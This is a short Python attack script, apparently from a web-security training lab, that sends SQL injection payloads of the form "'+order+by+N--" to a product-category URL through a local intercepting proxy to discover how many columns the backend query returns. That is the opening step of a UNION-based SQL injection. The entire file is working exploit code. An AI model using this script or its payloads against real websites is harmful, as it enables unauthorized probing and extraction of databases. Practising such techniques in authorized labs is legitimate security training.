import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    uri = 'filter?category=Gifts'
    for i  in range(1,5):
        payload = "'+order+by+%s--" % i
        r = requests.get(url + uri + payload, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            return i - 1
        i = i + 1
    return False 


if __name__ == "__main__" :
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print('[-] Usage: %s <url> <payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com <payload>' % sys.argv[0])
        sys.exit(-1)

print("[+] Figuring out number of columns")
num_cols = exploit_sqli_column_number(url)

if num_cols :
    print("[+] SQL injection successful, the number of columns is %s" %num_cols)
else :
    print("[+] SQL injection unsuccessful")